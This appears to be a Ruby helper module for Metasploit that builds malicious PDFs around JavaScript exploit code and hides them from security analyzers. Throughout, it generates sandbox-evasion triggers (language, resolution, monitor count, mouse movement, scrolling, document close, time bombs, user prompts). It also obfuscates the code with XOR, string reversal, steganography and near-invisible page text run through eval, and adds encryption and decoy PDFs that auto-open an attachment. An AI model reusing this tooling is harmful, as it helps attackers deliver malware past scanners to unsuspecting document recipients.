=begin
implementation of various static and dynamic PDF evasions.
the evasions are generated in JavaScript,
using the arguments passed to 'apply_evasion_js' function below.
the generated JavaScript snippet would then be embedded in a PDF file.
Author: Saeed Ehteshamifar (salpha.2004@gmail.com)
Summer 2017
=end


require 'origami' # required for apply_evasion_make_pdf
require 'msf/core' # required for OptString
require 'uri' # required for evasions xor & rev

load File.join(__dir__, "steganography.rb")
load File.join(__dir__, "pdf_objs.rb")

module Evasion

  include Origami

  MAX_NUM_OF_LINES_PER_PAGE = 40

    # TODO: dynamically add new evasion options for each selected evasion to take the evasion's args.
  def register_evasion_options(ms_module_class)
    register_options(
      [
        Msf::OptString.new('dynamic_evasion?', [ false, 'Should the module evade dynamic analyzers?',
          'no']),
        Msf::OptString.new('dynamic_evasion', [ false, 'The dynamic evasion technique. Values are as follows.
          lang: Exploit on certain Adobe languages.
          filename: Exploit if the PDF filename was not changed.
          speaker: Exploit on certain Windows versions.
          resol: Exploit on certain desktop resolutions.
          mons: Exploit on certain number of attached monitors.
          alert_one: Exploit after an alert box with a single button is gone.
          alert_three: Exploit after an alert box with three buttons is gone.
          mouse: Exploit if the mouse position was changed at all.
          scroll: Exploit after scrolling to certain a page.
          doc_close: Exploit after the document is closed.
          captcha: Ask the user for a response and exploit if the response was as expected.
          delay: Time bomb; exploit after a certain amount of time is passed.
          tod: Exploit on a certain time of day.
          rand: Exploit randomly based on a number.',  'filename']),
        Msf::OptString.new('static_evasion?', [ false, 'Should the module evade static analyzers?',
          'no']),
        Msf::OptString.new('static_evasion', [ false, 'The static evasion technique. Values are as follows.
          xor: Xor the JS code block string with a key.
          decoy: Put the JS data in a (benign) decoy file.
          enc: Encrypt the document with the given password.
          rev: Reverse the JS block string.
          nest: Nest (embed) the final generated PDF exploit in the given decoy n times.
          content: Put the JS code in the content of the PDF file and load and run it at run-time.',  'rev']),
      ], ms_module_class)
  end



  def apply_evasion_js(js, args)
    # IMPORTANT: first dynamic evasions should be applied, then static evasions.
    if (args['dynamic_evasion?'] == "yes")
      js = DynamicEvasion.make_evasion(js, args)
    end

    if (args['static_evasion?'] == "yes")
        js = StaticEvasion.make_evasion(js, args)
    end

    return js
  end


  def apply_evasion_make_pdf(js, args, objs)
    # TODO: separation of concerns: handle 'decoy' evasion in StaticEvasion class and avoid code duplication!
    if (args['static_evasion?'] == "yes" and args['static_evasion'].include? "decoy") # load decoy...
      if (args['decoy_path'].nil? or args['decoy_path'].empty? or
        not File.exists?(args['decoy_path']))
        # silently skip errors to avoid interrupting the sample generating process.
        pdf = PDF.new.append_page(page = Page.new)
        pdf.pages.first.write "Are you there?", size: 30
      else
        pdf = PDF.read(args['decoy_path'])
      end  
    else # create a new pdf file...
      pdf = PDF.new.append_page(page = Page.new)
      # the following is based on an example from origami (https://github.com/gdelugre/origami)
      # add arbitrary content to the PDF to change the file signature for instance
      contents = ContentStream.new.setFilter(:FlateDecode)
      contents.write "Greetings from Mars!",
          x: 10, y: 825, size: 10, rendering: Text::Rendering::FILL,
          fill_color: Graphics::Color::RGB.new(0xFF, 0x80, 0x80)
      contents.write "Here you weigh 38% less than on Earth.",
          x: 10, y: 810, size: 12, rendering: Text::Rendering::FILL
      contents.write "\nPretty cheap way to lose weight eh?",
          x: 10, y: 800, size: 12, color: Graphics::Color::RGB.new(0, 0, 255)
      page.Contents = contents
      # append another page to make sure there are at least two pages (required to see the impact of scroll)
      pdf.append_page(Page.new)
    end

    # check and implement steg here (above evasion 'content')
    # it's better to hide steg's stub in the file content than the other way
    # TODO: separation of concerns: somehow handle 'steganography' evasion in StaticEvasion class. the problem is that the js code is touched by this evasion and this should happen before putting the js in the pdf.
    if (args['static_evasion?'] == "yes" and args['static_evasion'].include? "steganography")
      img = Steganography.encode(js)

      # TODO: i wish we could put the image inside the pdf here and not rely on Acrobat Pro to do this (not feasible because DCTFilter is not yet implemented in Origami)

      js = %Q|
        function read (ic_name) {
          var ic = this.getIcon(ic_name);
          var st = util.iconStreamFromIcon(ic); // rgba1rgba2...
          var modMessage = [];
          
          // T O D O: stop before scanning the whole stream
          while (bytee = st.read(1)) {
            alpha = parseInt("0x" + bytee);
            modMessage.push(alpha-(255-11+1));
            st.read(3);
          }
          var codeUnitSize = 16;
          var t = 3;
          var message = "", charCode = 0, bitCount = 0, mask = Math.pow(2, codeUnitSize)-1;

          for(var i = 0; i < modMessage.length; i+=1) {
            charCode += modMessage[i] << bitCount;
            bitCount += t;
            if(bitCount >= codeUnitSize) {
              message += String.fromCharCode(charCode & mask);
              bitCount %= codeUnitSize;
              charCode = modMessage[i] >> (t-bitCount);
            }
          }
          if (charCode !== 0)
            message += String.fromCharCode(charCode & mask);
          
          var final_message = "";
          var LAST_ASCII_CHAR = 127;
          
          for (var i=0; i<message.length; i++) {
            if (message.charCodeAt(i) <= LAST_ASCII_CHAR)
              final_message += message.charAt(i);
            else
              break;
          }
          
          return final_message;
        }
        eval(read("marshmallow"));
      |
    end

    # TODO: separation of concerns: somehow handle 'content' evasion in StaticEvasion class. the problem is that the js code is touched by this evasion and this should happen before putting the js in the pdf.
    if (args['static_evasion?'] == "yes" and args['static_evasion'].include? "content")
      old_pages_count = pdf.pages.count # needed to know after which page comes the JS code.

      # append the JS code to the pdf's content
      page_content = ""
      js_lines_count = js.count("\n")
      js.each_line.with_index do |line, line_idx|
        page_content += line
        next if ((line_idx+1)%MAX_NUM_OF_LINES_PER_PAGE != 0 and (line_idx+1) < js_lines_count)
        pdf.append_page(page = Page.new)
        js_contents = ContentStream.new.setFilter(:FlateDecode)
        # TODO: break long lines so that they fit inside the page (rather than decreasing the size!)
        js_contents.write page_content,
          x: 0, y: 825, size: 0.01, rendering: Text::Rendering::FILL
        page.Contents = js_contents
        page_content = ""
      end

      new_pages_count = pdf.pages.count # needed to know until which page goes the JS code.

      # the new js should take care of reading the original js from the pdf content only
      js = %Q|
        box = "";
        for (i=#{old_pages_count}; i<#{new_pages_count}; i++) {
          cnt = this.getPageNumWords(i);
          for (j=0; j<cnt; j++)
            box += this.getPageNthWord(i, j, false);
        }
        eval(box);
      |
    end

    # the following adds the necessary objects (e.g. xfa, font) so that the exploit works.
    pdf = PDFObj.pdf_add_objs(pdf, args, js, objs)

    # change the pdf file created above appropriately according to the evasions.
    if (args['dynamic_evasion?'] == "yes")
      pdf = DynamicEvasion.change_pdf(pdf, js, args)
    end

    if (args['static_evasion?'] == "yes")
      # if pdf static evasions (not js static evasions) are used,
      # the following applies them on the pdf object yielded above.
      pdf = StaticEvasion.change_pdf(pdf, args)
    end

    # the image file produced as a result of steganography
    if (defined? img and not img.nil?)
      return pdf, img
    else
      return pdf
    end
  end

#################################################################################################
#################################################################################################
#################################################################################################

  class StaticEvasion
    include Origami

    # TODO: once you moved the implementation of 'decoy' evasion inside this class,
    # use the following function to load the decoy in all cases (decoy, nest, objstm)
    def self.load_wrapper_decoy(args, evasion)
      key = evasion + '_wrapper_decoy'
      if (args[key].nil? or args[key].empty? or
        not File.exists?(args[key]))
        # silently skip errors to avoid interrupting the sample generating process.
        envelope = PDF.new.append_page(page = Page.new)
        envelope.pages.first.write "Who's there?", size: 30
      else
        envelope = PDF.read(args[key])
      end
      return envelope
    end

    def self.change_pdf(pdf, args)
    
      # deal with evasion nest
      # TODO: using Acrobat Pro to embed the icon, nest would be incompatible with 'steganography'.
      if (args['static_evasion'].include? "nest" and not args['static_evasion'].include? "steganography")
        envelope = self.load_wrapper_decoy(args, "nest")
        envelope_content = StringIO.new
        pdf.save(envelope_content)
        envelope_content.rewind
        envelope.attach_file(envelope_content, register: true, name: args['FILENAME'])
        envelope.pages.first.onOpen(Action::GoToE[args['FILENAME']])
        envelope_content.close
        if (args['nesting_times'].nil? or args['nesting_times'].empty? or
            args['nesting_times'].to_i < 1 or args['nesting_times'].to_i > 10)
          # silently skip errors to avoid interrupting the sample generating process.
          nesting_times = 1
        else
          nesting_times = args['nesting_times'].to_i
        end
        while (nesting_times > 1) # nesting was already one time done above.
            envelope_content = StringIO.new
            envelope.save(envelope_content)
            envelope_content.rewind
            envelope = self.load_wrapper_decoy(args, "nest") # reload the original envelope
            envelope.attach_file(envelope_content, register: true, name: args['FILENAME'])
            envelope.pages.first.onOpen(Action::GoToE[args['FILENAME']])
            envelope_content.close
            nesting_times -= 1
        end
        pdf = envelope
      end

      # deal with evasion enc
      # TODO: there are still some issues with enc + xfa forms (open issue on github)
      if (args['static_evasion'].include? "enc")
        if (args['password'].nil?)
          args['password'] = ""
        end
        pdf.encrypt(user_passwd: args['password'],
                    owner_passwd: args['password'],
                    cipher: 'aes',
                    key_size: 256)
      end

      # deal with evasion objstm
      # TODO: using Acrobat Pro to embed the icon, objstm would be incompatible with 'steganography'.
      if (args['static_evasion'].include? "objstm" and not args['static_evasion'].include? "steganography")
        new_pdf = self.load_wrapper_decoy(args, "objstm")
        objstm = ObjectStream.new
        objstm.Filter = :FlateDecode
        new_pdf.insert(objstm)

        pdf.save(pdf_str = StringIO.new)
        pdf_str.rewind
        
        objstm.insert(new_pdf.attach_file(pdf_str, register: true, name: args['FILENAME']))

        objstm.insert(new_pdf.Catalog.Pages)
        objstm.insert(new_pdf.Catalog.Names)
        objstm.insert(new_pdf.Catalog.Names.EmbeddedFiles)
        objstm.insert(new_pdf.Catalog)
        objstm.insert(new_pdf.pages.first)

        new_pdf.pages.first.onOpen Action::GoToE[args['FILENAME']]

        pdf = new_pdf
      end

      return pdf
    end

    def self.xor(str, key)
      str.split(//).collect {|e| [e.unpack('C').first ^ (key.to_i & 0xFF)].pack('C')}.join
    end

    def self.validate_xor_key(xor_key_str)
      xor_key = xor_key_str.to_i
      if (  (32 <= xor_key and xor_key <= 40) or
            (42 <= xor_key and xor_key <= 63) or
            (110 <= xor_key and xor_key <= 116) )
        return true
      else
        return false
      end
    end

    def self.make_evasion(js, args)
      # TODO: combining incompatible static evasions (the order should be incorporated?) do something appropriate without raising exceptions!
      js_with_static_evasion = js
      # evasions 'decoy', 'nest', and 'enc' are implemented where the pdf file is created.

      if args['static_evasion'].include? "xor"
        if (validate_xor_key(args['xor_key']) == false)
          # silently skip errors to avoid interrupting the sample generating process.
          args['xor_key'] = "110"
        end
        xored_js = URI.escape(xor(js, args['xor_key']))
        js_with_static_evasion = %Q|
        function get_back (str, key) {
        var res = "";
        for (var i in str)
        res += String.fromCharCode(str.charCodeAt(i) ^ key);
        return res;
        }
        var hippo = decodeURI("#{xored_js}");
        var big_hippo = get_back(hippo, #{args['xor_key']});
        var bigger_hippo = big_hippo.replace(/~ih/g, "x");
        app.eval(bigger_hippo);
        |
      end

      if args['static_evasion'].include? "rev"
        rev_js = URI.escape(js.reverse())
        js_with_static_evasion = %Q|
        var hippo = decodeURI("#{rev_js}");
        var big_hippo = hippo.split("").reverse().join("");
        app.eval(big_hippo);
        |
      end

      return js_with_static_evasion
    end
  end

#################################################################################################
#################################################################################################
#################################################################################################

  class DynamicEvasion

    def self.change_pdf(pdf, js, args)
      # deal with doc_close and scroll evasions
      if (args['dynamic_evasion'].include? "doc_close" and args['dynamic_evasion'].include? "scroll")
        # remove the OpenAction action that was added by 'make_basic_pdf' function.
        pdf.Catalog.OpenAction = nil

        # this single line would be executed after scrolling
        # to flag that the document was scrolled to the given page...
        scroll_js = %Q|
          var scrld = true;
        |
        if (args['page_number'].nil? or args['page_number'].empty? or
           args['page_number'].to_i > pdf.pages.size or args['page_number'].to_i < 1)
          # silently set the page number to the last page to avoid interrupting the sample generating process.
          args['page_number'] = pdf.pages.size
        end
        pdf.pages[args['page_number'].to_i-1].onOpen(Origami::Action::JavaScript scroll_js)

        # check if the doc was scrolled...
        new_js = %Q|
          if (scrld) {
        | + js + "}"
        pdf.onDocumentClose(Origami::Action::JavaScript new_js)
      elsif (args['dynamic_evasion'].include? "doc_close")
        # remove the OpenAction action that was added by 'make_basic_pdf' function.
        # there's no method in PDF class to remove it so we assign it to nil.
        pdf.Catalog.OpenAction = nil
        pdf.onDocumentClose(Origami::Action::JavaScript js)
      elsif (args['dynamic_evasion'].include? "scroll")
        if (args['page_number'].nil? or args['page_number'].empty? or
           args['page_number'].to_i > pdf.pages.size or args['page_number'].to_i < 1)
          # silently set the page number to the last page to avoid interrupting the sample generating process.
          args['page_number'] = pdf.pages.size
        end
        # remove the OpenAction action that was added by 'make_basic_pdf' function.
        pdf.Catalog.OpenAction = nil
        pdf.pages[args['page_number'].to_i-1].onOpen(Origami::Action::JavaScript js)
      end

      return pdf
    end



    def self.make_evasion(js, args)
      js_with_dynamic_evasion = ""

      for dynamic_evasion in args['dynamic_evasion'].split(",")
        case dynamic_evasion.strip
        # exploit if the Adobe Reader language is one of the languages passed as arg.
        when "lang"
          js_with_evasion = %Q|
          var flag = 0;
          var arr = "#{args['languages']}".split(",");
          for (var i in arr) {
            arr[i] = arr[i].toLowerCase().replace(/ /g, "");
            if (arr[i] == app.language.toLowerCase()) {
              flag = 1;
              break;
            }
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit if the the filename was not changed.
        when "filename"
          js_with_evasion = %Q|
          var flag = 0;
          if (this.documentFileName == "#{args['FILENAME']}")
            flag = 1;
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit if the target has screen resolution in the given range or it is portrait.
        when "resol"
          js_with_evasion = %Q|
          var flag = 0;
          // the first call initializes the obj!
          app.monitors.toSource();
          var mon_arr = app.monitors[0].rect.toString().split(",")
          var width = 0, height = 0;
          for (var i in mon_arr) {
            mon_arr[i] = Math.abs(parseInt(mon_arr[i]));
            if (mon_arr[i] > 0 && width == 0)
              width = mon_arr[i];
            else if (mon_arr[i] > 0 && width > 0)
              height = mon_arr[i];
          }
          // proceed only if the values are set.
          if (width > 0 && height > 0) {
            var arr = "#{args['resolution']}".split(",");
            for (var i in arr) {
              arr[i] = arr[i].toLowerCase().replace(/ /g, "");
              if (
                arr[i] == "portrait"
                &&
                height > width
                ) {
                flag = 1;
                break;
              }
              if (arr[i].indexOf(">=") >= 0) {
                if (
                  (width >= parseInt(arr[i].split(">=")[1].split("x")[0]))
                  &&
                  (height >= parseInt(arr[i].split(">=")[1].split("x")[1]))
                  ) {
                  flag = 1;
                  break;
                }
              }
              else if (arr[i].indexOf(">") >= 0) {
                if (
                  (width > parseInt(arr[i].split(">")[1].split("x")[0]))
                  &&
                  (height > parseInt(arr[i].split(">")[1].split("x")[1]))
                  ) {
                  flag = 1;
                  break;
                }
              }
              if (arr[i].indexOf("<=") >= 0) {
                if (
                  (width <= parseInt(arr[i].split("<=")[1].split("x")[0]))
                  &&
                  (height <= parseInt(arr[i].split("<=")[1].split("x")[1]))
                  ) {
                  flag = 1;
                  break;
                }
              }
              else if (arr[i].indexOf("<") >= 0) {
                if (
                  (width < parseInt(arr[i].split("<")[1].split("x")[0]))
                  &&
                  (height < parseInt(arr[i].split("<")[1].split("x")[1]))
                  ) {
                  flag = 1;
                  break;
                }
              }
            }
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit if the target has given number of monitors.
        when "mons"
          js_with_evasion = %Q|
          var flag = 0;
          // the first call initializes the obj!
          app.monitors.toSource();
          var len = app.monitors.length;
          var arr = "#{args['mons_count']}".split(",");
          for (var i in arr) {
            if (len == parseInt(arr[i])) {
              flag = 1;
              break;
            }
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # show an alert box before the exploitation
        when "alert_one"
          dialog_type = 3 # by default show "info" dialog.
          case "#{args['alert_type']}".downcase().gsub(/\s+/, '')
          when "error"
            dialog_type = 0
          when "warning"
            dialog_type = 1
          when "question"
            dialog_type = 2
          when "info"
            dialog_type = 3
          end
          js_with_evasion = %Q|
          app.alert({cMsg:"#{args['alert_text']}",
            nIcon:#{dialog_type},
            nType:0,
            cTitle:"#{args['alert_title']}"});
          {
          |
          js_with_dynamic_evasion += js_with_evasion

        # show an alert box with three buttons. exploit if the user presses given button(s).
        when "alert_three"
          dialog_type = 3 # by default show "info" dialog.
          case "#{args['alert_type']}".downcase().gsub(/\s+/, '')
          when "error"
            dialog_type = 0
          when "warning"
            dialog_type = 1
          when "question"
            dialog_type = 2
          when "info"
            dialog_type = 3
          end
          js_with_evasion = %Q|
          var resp = app.alert({cMsg:"#{args['alert_text']}",
            nIcon:#{dialog_type},
            nType:3,
            cTitle:"#{args['alert_title']}"});
          var resp_str = "yes";
          if (resp == 3)
            resp_str = "no";
          if (resp == 2)
            resp_str = "cancel";
          var flag = 0;
          var arr = "#{args['intended_buttons']}".split(",");
          for (var i in arr) {
            arr[i] = arr[i].toLowerCase().replace(/ /g, "");
            if (arr[i] == resp_str) {
              flag = 1;
              break;
            }
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        when "mouse"
          # exploit if the mouse was moved at all.
          # TODO: implement the evasion without busy waiting.
          js_with_evasion = %Q|
          var x = this.mouseX;
          var y = this.mouseY;
          while (x == this.mouseX \|\| y == this.mouseY);
          {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit after scrolling to a certain page.
        when "scroll"
          # this evasion is implemented where the pdf file is being created.
          # just open the bracket to stack the evasions in case there's more than one evasion.
          js_with_dynamic_evasion += "{"

        # exploit after the document is closed.
        when "doc_close"          
          # this evasion is implemented where the pdf file is being created.
          # just open the bracket to stack the evasions in case there's more than one evasion.
          js_with_dynamic_evasion += "{"

        # exploit if the user's text input matches the given arg.
        when "captcha"
          js_with_evasion = %Q|
          var resp = app.response({cQuestion:"#{args['response_box_question']}",
            cTitle:"#{args['response_box_title']}"});
          var resp_lower_arr = resp.toLowerCase().split(" ");
          var flag = 0;
          var arr = "#{args['intended_responses']}".split(",");
          for (var i in arr) {
            for (var j in resp_lower_arr) {
              // Adobe 9 has not implemented string.contains().
              if (arr[i].toLowerCase().replace(/ /g, "") == resp_lower_arr[j]) {
                flag = 1;
                break;
              }
            }
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit after some delay (in seconds).
        when "delay"
          js_with_evasion = %Q|
          for (var del=0; del < #{args['delay'].to_i}; del++) {
            var dump = 0;
            for (var j=1; j<Math.pow(2, 18); j++) {
              dump = j+1;
              if ((j % 1024) == 0) {
                dump = 1;
              }
            }
          }
          {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit at certain time(s) of day.
        when "tod"          
          js_with_evasion = %Q|
          var date_flag = 0, time_flag = 0;
          var cur_date = util.printd("d.m.yy", new Date());
          var cur_hr = util.printd("H", new Date());
          if ("#{args['date']}".toLowerCase().replace(/ /g, "") == "everyday") {
            date_flag = 1;
          }
          else {
            var arr = "#{args['date']}".split(","); 
            for (var i in arr) {
              if (arr[i].replace(/ /g, "") == cur_date) {
                date_flag = 1;
                break;
              }
            }
          }
          if ("#{args['time']}".toLowerCase().replace(/ /g, "") == "anytime") {
            time_flag = 1;
          }
          else {
            var arr = "#{args['time']}".split(",");
            for (var i in arr) {
              arr[i] = arr[i].replace(/ /g, "");
              if (arr[i].indexOf(">=") >= 0) {
                time_flag = 1;
                // if any condition doesn't hold, don't proceed.
                if (!(cur_hr >= parseInt(arr[i].split(">=")[1]))) {
                  time_flag = 0;
                  break;
                }
              }
              else if (arr[i].indexOf(">") >= 0) {
                time_flag = 1;
                // if any condition doesn't hold, don't proceed.
                if (!(cur_hr > parseInt(arr[i].split(">")[1]))) {
                  time_flag = 0;
                  break;
                }
              }
              if (arr[i].indexOf("<=") >= 0) {
                time_flag = 1;
                // if any condition doesn't hold, don't proceed.
                if (!(cur_hr <= parseInt(arr[i].split("<=")[1]))) {
                  time_flag = 0;
                  break;
                }
              }
              else if (arr[i].indexOf("<") >= 0) {
                time_flag = 1;
                // if any condition doesn't hold, don't proceed.
                if (!(cur_hr < parseInt(arr[i].split("<")[1]))) {
                  time_flag = 0;
                  break;
                }
              }
              if (cur_hr == parseInt(arr[i])) {
                time_flag = 1;
                break;
              }
            }
          }
          if (date_flag && time_flag) {
          |
          js_with_dynamic_evasion += js_with_evasion

        # exploit if the generated random number is in the given range.
        when "rand"
          js_with_evasion = %Q|
          var flag = 0;
          var rnd = Math.random();
          // explicitly ignore other args, if the user has passed more than one.
          var input = "#{args['rand_range']}".replace(/ /g, "").split(",")[0];
          if (input.indexOf(">=") >= 0) {
            if (rnd >= parseFloat(input.split(">=")[1]))
              flag = 1;
          }
          else if (input.indexOf(">") >= 0) {
            if (rnd > parseFloat(input.split(">")[1]))
              flag = 1;
          }
          if (input.indexOf("<=") >= 0) {
            if (rnd <= parseFloat(input.split("<=")[1]))
              flag = 1;
          }
          else if (input.indexOf("<") >= 0) {
            if (rnd < parseFloat(input.split("<")[1]))
              flag = 1;
          }
          if (flag) {
          |
          js_with_dynamic_evasion += js_with_evasion
        end # close the switch
      
      end # close the loop
      
      # close all brackets that were opened for each evasion.
      return js_with_dynamic_evasion + js + "}" * args['dynamic_evasion'].split(",").length
    end # close the function

  end # close the class

end # close the module

